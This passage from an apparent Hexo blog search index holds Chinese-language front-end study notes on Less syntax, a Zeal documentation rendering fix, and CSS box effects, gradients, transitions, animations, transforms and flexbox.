继承div的属性，自己也有独特的属性 */</span></span><br><span class="line"><span class="selector-class">.box</span>:<span class="selector-tag">extend</span>(div)&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#bbffaa</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* mixin 混合 </span></span><br><span class="line"><span class="comment">    也就是直接对已有样式进行调用</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="selector-class">.box2</span>&#123;</span><br><span class="line">    <span class="selector-class">.test</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 创建mixins1,不会被编译 */</span></span><br><span class="line"><span class="selector-class">.my-mix</span>()&#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">2px</span> solid red;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 创建mixins2 */</span></span><br><span class="line"><span class="selector-class">.my-mix2</span>(<span class="variable">@var1</span>,<span class="variable">@var2</span>)&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="variable">@var1</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="variable">@var2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 使用mixins2 */</span></span><br><span class="line"><span class="selector-class">.box3</span>&#123;</span><br><span class="line">    <span class="selector-class">.my-mix2</span>(<span class="number">100px</span>, <span class="number">200px</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译的css源码</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* less，css块注释，会编译到css文件内 */</span></span><br><span class="line"><span class="selector-tag">div</span>,</span><br><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="comment">/* 变量直接使用 */</span></span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="comment">/* 引用其他属性 */</span></span><br><span class="line">  <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="comment">/* 变量作为部分值的使用 */</span></span><br><span class="line">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;img/1.png&quot;</span>);</span><br><span class="line">  <span class="comment">/* div里的元素样式 */</span></span><br><span class="line">  <span class="comment">/* &amp;代表外层的父元素 */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">div</span> <span class="selector-tag">span</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">div</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: blue;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 变量作为类名的使用 */</span></span><br><span class="line"><span class="selector-class">.test</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 继承div的属性，自己也有独特的属性 */</span></span><br><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#bbffaa</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* mixin 混合 </span></span><br><span class="line"><span class="comment">    也就是直接对已有样式进行调用</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="selector-class">.box2</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 创建mixins1,不会被编译 */</span></span><br><span class="line"><span class="comment">/* 创建mixins2 */</span></span><br><span class="line"><span class="comment">/* 使用mixins2 */</span></span><br><span class="line"><span class="selector-class">.box3</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此外，less里面的所有数据都可以进行运算</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wdith: <span class="number">200px</span> +<span class="number">100px</span>;</span><br></pre></td></tr></table></figure><p>less还给我们提供了很多的函数</p><h3 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h3><ul><li>相当与将别的less文件内容复制进来</li><li>优点就是将代码模块化，比如var.less文件管理变量，mixins.less管理函数..</li><li>方便后期维护管理</li></ul><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@import</span> <span class="string">&quot;lessFileName&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h3><p>因为在浏览器的开发工具里显示的都是css代码位置，所以需要使用less工具来帮助我们进行调试</p><ul><li>更改less的json配置文件把sourceMap改为true即可</li><li>再次进入开发者工具显示的就是less代码位置</li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> less </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用zeal查看官方文档</title>
      <link href="/Front-end/%E4%BD%BF%E7%94%A8zeal.html"/>
      <url>/Front-end/%E4%BD%BF%E7%94%A8zeal.html</url>
      
        <content type="html"><![CDATA[<p>zeal是一个查看官方的文档的软件，非常好用，但有些需要T子，这里列出使用时的问题</p><span id="more"></span><p><strong>解决zeal-Content-rendering-error</strong></p><p>把文档的路径下</p><p><code>Contents\Resources\Documents\developer.mozilla.org\static\build\js</code></p><p>下的<code>react-main.&lt;hashcode&gt;.js</code></p><p>删除即可</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> zeal </tag>
            
            <tag> 文档 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>各种盒子特效</title>
      <link href="/Front-end/CSS/4.%E5%90%84%E7%A7%8D%E7%9B%92%E5%AD%90%E7%89%B9%E6%95%88.html"/>
      <url>/Front-end/CSS/4.%E5%90%84%E7%A7%8D%E7%9B%92%E5%AD%90%E7%89%B9%E6%95%88.html</url>
      
        <content type="html"><![CDATA[<h2 id="盒子大小"><a href="#盒子大小" class="headerlink" title="盒子大小"></a>盒子大小</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line"><span class="attribute">box-sizing</span>: content-box;</span><br><span class="line"><span class="attribute">box-sizing</span>: border-box;</span><br></pre></td></tr></table></figure><p>box-sizing：用来设置盒子尺寸的计算方式</p><span id="more"></span><p>属性</p><ul><li>content-box：默认值，高度和宽度代表内容区的大小</li><li>border-box：宽度和高度代表整个可见框的大小，设置边框宽度和内边距时内容区往里缩，当内边距超过盒子大小才会扩大</li></ul><p>normal 默认值 从from到他哦<br>reverse 从to到from<br>alternate 从from到to 重复执行时反向执行轮廓与圆角</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">outline</span>: <span class="number">10px</span> red solid</span><br></pre></td></tr></table></figure><p>outline用来设置轮廓线，属性和border一样，区别就是不会影响布局</p><h2 id="阴影"><a href="#阴影" class="headerlink" title="阴影"></a>阴影</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">box-shadow</span>: <span class="number">10px</span> <span class="number">20px</span> <span class="number">50px</span> <span class="built_in">rgb</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,.<span class="number">3</span>);</span><br></pre></td></tr></table></figure><p>设置元素的阴影</p><ul><li><p>第一个值是水平偏移量，正值向右，负值向左</p></li><li><p>第一个值是垂直偏移量，正值向下，负值向上</p></li><li><p>第三个值，模糊半径</p></li><li><p>第四个值代表，阴影颜色</p></li></ul><h2 id="圆角"><a href="#圆角" class="headerlink" title="圆角"></a>圆角</h2><ul><li>以圆画圆角</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">border-radius</span>: <span class="number">10px</span>;</span><br><span class="line"><span class="attribute">border-top-left-radius</span>: <span class="number">10px</span>;</span><br><span class="line"><span class="attribute">border-top-right-radius</span>: <span class="number">10px</span>;</span><br><span class="line"><span class="attribute">border-bottom-right-radius</span>: <span class="number">10px</span>;</span><br><span class="line"><span class="attribute">border-bottom-left-radius</span>: <span class="number">10px</span>;</span><br><span class="line"><span class="comment">/* 左上/右下 右上/左下  */</span></span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">10px</span> <span class="number">50px</span>;</span><br><span class="line"><span class="comment">/*  左上 右上、左下 右下*/</span></span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">10px</span> <span class="number">30px</span> <span class="number">50px</span>;</span><br><span class="line"><span class="comment">/* 左上 右上 右下 左下 */</span></span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">10px</span> <span class="number">20px</span> <span class="number">30px</span> <span class="number">40px</span>;</span><br></pre></td></tr></table></figure><ul><li>以椭圆画圆角</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 第一个值代表水平半径a，第二个值代表垂直半径b */</span></span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">10px</span>/<span class="number">40px</span>;</span><br></pre></td></tr></table></figure><ul><li>圆</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 圆形 */</span></span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">50%</span>;</span><br></pre></td></tr></table></figure><h2 id="文本垂直对齐"><a href="#文本垂直对齐" class="headerlink" title="文本垂直对齐"></a>文本垂直对齐</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">vertical-align</span>: middle;</span><br><span class="line"><span class="attribute">vertical-align</span>: <span class="number">10px</span>;</span><br></pre></td></tr></table></figure><p>文本都是在基线(baseline)上面的，使用vertical-align设置对齐方式</p><p>值</p><ul><li><p>正值向上移动，负值向下移动</p></li><li><p>top：顶部对齐</p></li><li><p>baseline：默认值，沿基线对齐</p></li><li><p>bottom：底部对齐</p></li><li><p>middle：在父元素里居中</p></li></ul><p>主要是这个可以解决图片布局的问题，图片在默认情况下是有基线的，它在父元素里并不会把父元素占满，而是在基线之上，去除这个影响就可以使用这个属性，更改默认值就行了</p><h2 id="文本溢出处理"><a href="#文本溢出处理" class="headerlink" title="文本溢出处理"></a>文本溢出处理</h2><p>当一行文本超过屏幕宽度或指定宽度时，设置处理方式</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*默认值*/</span></span><br><span class="line"><span class="attribute">white-space</span>: normal;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">nowrap:不换行</span></span><br><span class="line"><span class="comment">pre：保留格式</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*超出后的范围隐藏*/</span></span><br><span class="line"><span class="attribute">overflow</span>:hidden;</span><br><span class="line"><span class="comment">/*显示省略号*/</span></span><br><span class="line">test-over-flow: elipsis;</span><br></pre></td></tr></table></figure><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>background-clip:裁剪背景</p><ul><li>值<ul><li>border-box:默认值，背景会出现在边框下面</li><li>padding-box：背景不会出现在边框，出现在内容区和内边距</li><li>content-box：出现在内容区</li></ul></li></ul><p>background-orgin：背景偏移计算的原点</p><ul><li>值<ul><li>padding-box：默认值，position从内边距开始计算</li><li>content-box：从内容区计算</li><li>border-box：从边框计算</li></ul></li></ul><p>background-size：设置图片大小</p><ul><li>第一个值代表宽度，第二个值代表高度</li><li>cover：按照图片比例将元素铺满</li><li>contain：图片比例不变，在元素中完整显示</li></ul><blockquote><p>简写注意</p><p>size必须写在position后面，使用/隔开</p><p>orgin和clip必须按照顺序来</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">background</span>: center center / cover content-box content-box;</span><br></pre></td></tr></table></figure></blockquote><h2 id="渐变"><a href="#渐变" class="headerlink" title="渐变"></a>渐变</h2><p>渐变就是将一个颜色向其他颜色进行过渡的效果，需要注意的是，渐变是图片，所以需要使用background-image设置</p><h3 id="线性渐变"><a href="#线性渐变" class="headerlink" title="线性渐变"></a>线性渐变</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 表示从1px/red到30px/green开始渐变 ，默认从上到下*/</span></span><br><span class="line"><span class="attribute">background-image</span>: <span class="built_in">linear-gradient</span>( red <span class="number">1px</span>,green <span class="number">30px</span>);</span><br><span class="line"><span class="comment">/* to right/left/top/bottom ,to right bottom */</span></span><br><span class="line"><span class="attribute">background-image</span>: <span class="built_in">linear-gradient</span>(to right, <span class="built_in">rgb</span>(<span class="number">145</span>, <span class="number">12</span>, <span class="number">12</span>),green);</span><br><span class="line"><span class="comment">/* deg表示度，turn表示圈 */</span></span><br><span class="line"><span class="attribute">background-image</span>: <span class="built_in">linear-gradient</span>(<span class="number">45deg</span>,red,green);</span><br><span class="line"><span class="comment">/*平铺，从1-30像素的渐变平铺*/</span></span><br><span class="line"><span class="attribute">background-image</span>:<span class="built_in">repeating-linear-gradient</span>(red <span class="number">1px</span>,green <span class="number">30px</span>);</span><br></pre></td></tr></table></figure><h3 id="径向渐变"><a href="#径向渐变" class="headerlink" title="径向渐变"></a>径向渐变</h3><p>使用的时候查api，不怎么常用</p><p>介绍一下基本语法</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">background-image</span>:<span class="built_in">radial-gradient</span>(大小 at 位置, 颜色 位置,颜色 位置);</span><br></pre></td></tr></table></figure><h2 id="过渡"><a href="#过渡" class="headerlink" title="过渡"></a>过渡</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*指定属性，all代表所有属性*/</span></span><br><span class="line"><span class="attribute">transition-property</span>: height,width;</span><br><span class="line"><span class="comment">/*延迟时间*/</span></span><br><span class="line"><span class="attribute">transition-duration</span>: <span class="number">1s</span>,ms;</span><br></pre></td></tr></table></figure><ul><li><p>可以指定一个属性<strong>发生变化</strong>的切换方式</p></li><li><p>提升用户体验</p></li></ul><h3 id="过渡的时序函数"><a href="#过渡的时序函数" class="headerlink" title="过渡的时序函数"></a>过渡的时序函数</h3><p>指定过渡的执行方式</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">transition-timing-function</span>: ;</span><br></pre></td></tr></table></figure><p>可选值</p><ul><li><p>ease 默认值，加速-&gt; 减速</p></li><li><p>linear 匀速运动</p></li><li><p>ease-in 加速运动</p></li><li><p>ease-out 减速运动</p></li><li><p>ease-in-out 慢-&gt;加速-&gt;减速</p></li><li><p>cubic-bezier() 使用贝塞尔曲线</p><ul><li><a href="https://cubic-bezier.com/#.49,.5,.48,.51">https://cubic-bezier.com/#.49,.5,.48,.51</a></li></ul></li><li><p>steps() 分步执行过渡效果</p><ul><li><code>steps(3,end);</code></li><li>第二个值代表时间起始，默认值end表示时间结束，start表示开始时间执行</li></ul></li></ul><h3 id="延迟"><a href="#延迟" class="headerlink" title="延迟"></a>延迟</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">transition-delay</span>: <span class="number">2s</span>;</span><br></pre></td></tr></table></figure><ul><li>延迟i执行</li></ul><h3 id="简写"><a href="#简写" class="headerlink" title="简写"></a>简写</h3><ul><li>第一个时间是持续时间</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">transition</span>: <span class="number">1s</span> <span class="number">2s</span> ease all;</span><br></pre></td></tr></table></figure><h2 id="动画"><a href="#动画" class="headerlink" title="动画"></a>动画</h2><p>与过渡类似(有它的所有属性)，但不需要用属性触发，是动态的</p><ul><li>动画效果必须要设置一个关键帧，代表动画执行的步骤</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@keyframes</span> test &#123;</span><br><span class="line"><span class="comment">/* 开始位置，0% */</span></span><br><span class="line"><span class="selector-tag">from</span>&#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 结束位置 ，100%*/</span></span><br><span class="line"><span class="selector-tag">to</span>&#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>然后添加动画属性</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 执行的的动画关键帧 */</span></span><br><span class="line"><span class="attribute">animation-name</span>: test;</span><br><span class="line"><span class="comment">/* 持续时间 */</span></span><br><span class="line"><span class="attribute">animation-duration</span>: <span class="number">2s</span>;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">指定动画运行的方向</span></span><br><span class="line"><span class="comment">可选值</span></span><br><span class="line"><span class="comment">normal 默认值 从from到他哦</span></span><br><span class="line"><span class="comment">reverse 从to到from</span></span><br><span class="line"><span class="comment">alternate 从from到to 重复执行时反向执行</span></span><br><span class="line"><span class="comment">alternate-reverse 从to到from 重复执行时反向执行</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="attribute">animation-direction</span>: alternate;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">动画执行次数</span></span><br><span class="line"><span class="comment">          可选值</span></span><br><span class="line"><span class="comment">            数字</span></span><br><span class="line"><span class="comment">            infinite 无限执行</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="attribute">animation-iteration-count</span>: infinite;</span><br><span class="line"><span class="comment">/*  延时*/</span></span><br><span class="line">anmation-delay:<span class="number">2s</span>;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">设置动画执行状态</span></span><br><span class="line"><span class="comment">可选值</span></span><br><span class="line"><span class="comment">running 默认值 动画执行</span></span><br><span class="line"><span class="comment">paused 暂停</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="attribute">animation-play-state</span>: running;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">动画填充模式</span></span><br><span class="line"><span class="comment">可选值</span></span><br><span class="line"><span class="comment">none 默认 执行完回到原来位置</span></span><br><span class="line"><span class="comment">forwards 执行后停到结束位置</span></span><br><span class="line"><span class="comment">backwards 动画延时等待时，处于from的位置</span></span><br><span class="line"><span class="comment">both 结合上面两个</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="attribute">animation-fill-mode</span>: none;</span><br></pre></td></tr></table></figure><p>还有时序函数等等，和过渡一样</p><h3 id="简写-1"><a href="#简写-1" class="headerlink" title="简写"></a>简写</h3><ul><li>注意延时和延迟时间顺序即可<ul><li>第一个代表延迟，第二代表延时</li></ul></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">animation</span>:<span class="number">1s</span> <span class="number">2s</span> <span class="number">2</span> alternate;</span><br></pre></td></tr></table></figure><h2 id="变形"><a href="#变形" class="headerlink" title="变形"></a>变形</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">transform</span>: <span class="built_in">translateX</span>(-<span class="number">100px</span>);</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translateX</span>(<span class="number">50%</span>);</span><br><span class="line"><span class="comment">/*正值右 下，负值上左*/</span></span><br></pre></td></tr></table></figure><p>通过css改变元素的形状或位置，不会影响布局</p><p>transform用来设置这种效果</p><h3 id="平移"><a href="#平移" class="headerlink" title="平移"></a>平移</h3><ul><li>translateX()</li><li>translateY()</li><li>translateZ(),需要设置视窗大小(<code>perspective</code>)才有用</li></ul><blockquote><p>例子：当元素大小确定时可以使用绝对路径 ，过度约束来居中</p><p>但是对于大小不确定的元素，需要变形比较方便，比如</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translateX</span>(-<span class="number">50%</span>) <span class="built_in">translateY</span>(-<span class="number">50%</span>);</span><br></pre></td></tr></table></figure></blockquote><h3 id="旋转"><a href="#旋转" class="headerlink" title="旋转"></a>旋转</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">transform</span>: <span class="built_in">rotateY</span>(<span class="number">1turn</span>) <span class="built_in">translateZ</span>(<span class="number">800px</span>);</span><br></pre></td></tr></table></figure><p>指定元素沿着x y z轴旋转的角度（单位deg，turn）</p><ul><li>rotateX()</li><li>rotateY()</li><li>rotateZ()</li></ul><p>附一张坐标图</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/xyz.png" alt=""></p><p>注意旋转和平移的顺序，旋转后坐标轴会变化</p><ul><li>是否显示元素背面</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">backface-visibility</span>: visible;</span><br><span class="line"><span class="attribute">backface-visibility</span>: hidden;</span><br></pre></td></tr></table></figure><blockquote><p>3d效果要使用<code>transform-style: preserve-3d;</code></p></blockquote><h3 id="缩放"><a href="#缩放" class="headerlink" title="缩放"></a>缩放</h3><p>将元素进行缩放和放大</p><ul><li>scaleX() 水平缩放</li><li>scaleY() 垂直</li><li>scale() 双方向</li></ul><h3 id="原点"><a href="#原点" class="headerlink" title="原点"></a>原点</h3><p>变形原点</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">transform</span>-orgin:<span class="number">20px</span> <span class="number">20px</span>;</span><br><span class="line"><span class="comment">/*默认值center*/</span></span><br></pre></td></tr></table></figure><h2 id="弹性盒"><a href="#弹性盒" class="headerlink" title="弹性盒"></a>弹性盒</h2><ul><li><p>flex（弹性盒）是CSS的布局手段，是用来代替浮动的</p></li><li><p>使元素具有弹性，让元素随页面的大小改变而改变</p></li></ul><h3 id="弹性容器"><a href="#弹性容器" class="headerlink" title="弹性容器"></a>弹性容器</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dispaly: flex;</span><br><span class="line">dispaly: inline-flex;</span><br></pre></td></tr></table></figure><p>设置上面两个其中一个属性就是弹性容器了</p><ul><li>flex-direction<ul><li>row 默认值 弹性元素水平排列（左到右）</li><li>row-reverse 水平反向排列</li><li>column 纵向排列</li><li>column-reverse 纵向反向排列</li></ul></li><li>主轴：排列方向就是主轴</li><li>辅轴：与主轴垂直的方向</li><li>flex-wrap 设置元素是否换行<ul><li>nowarp 默认，不换行</li><li>warp 沿辅轴方向换行</li><li>warp-reverse  沿辅轴反方向换行</li></ul></li><li>flex-flow warp和direction的简写属性</li><li>justify-content 主轴上空白的分布<ul><li>flex-start 主轴起边排列</li><li>flex-end 终边排列</li><li>center 主轴中居中排列</li><li>space-around 空白分配到元素两侧</li><li>space-between 空白均匀分配到元素间，两端没有</li><li>space-evenly 空白分配到元素单侧</li></ul></li><li>align-items 辅轴排列元素<ul><li>stretch 默认 将元素长度设置为相同的值</li><li>flex-start 元素不会拉伸 沿辅轴起边对齐</li><li>flex-end 沿终边对齐</li><li>center 辅轴中居中对齐</li><li>baseline 基线对齐</li></ul></li><li>align-content 辅轴空白的分布<ul><li>flex-start 辅轴起边排列</li><li>flex-end 辅轴排列</li><li>center 辅轴中居中排列</li><li>space-around 空白分配到元素两侧</li><li>space-between 空白均匀分配到元素间，两端没有</li><li>space-evenly 空白分配到元素单侧</li></ul></li></ul><h3 id="弹性元素"><a href="#弹性元素" class="headerlink" title="弹性元素"></a>弹性元素</h3><ul><li>flex-grow 设置伸展系数<ul><li>定义了元素在多余空间的容器内怎么分布</li><li>每个元素都设置时按照比例分配</li></ul></li><li>flex-shrink 收缩系数<ul><li>当容器不够放下子元素时子元素的变化</li><li>1 默认值 等比例收缩</li><li>数值越大代表收缩越厉害</li></ul></li><li>align-self 覆盖当前的align-items</li><li>flex-basis 指定元素在主轴上的基础长度 <ul><li>主轴横向则代表宽度</li><li>纵向代表高度</li><li>默认auto，根据元素自身</li><li>指定数值则以数值为准</li></ul></li><li>flex 简写属性<ul><li><code>flex grow shrink basis</code></li><li>initial(0 1 auto)</li><li>auto(1 1 auto)</li><li>none(0 0 auto)</li></ul></li><li>order 指定排列顺序<ul><li>根据指定值排列顺序</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 背景 </tag>
            
            <tag> 渐变 </tag>
            
            <tag> 过渡 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>表格与表单</title>
      <link href="/Front-end/HTML/3.%E8%A1%A8%E6%A0%BC%E5%92%8C%E8%A1%A8%E5%8D%95.html"/>
      <url>/Front-end/HTML/3.%E8%A1%A8%E6%A0%BC%E5%92%8C%E8%A1%A8%E5%8D%95.html</url>
      
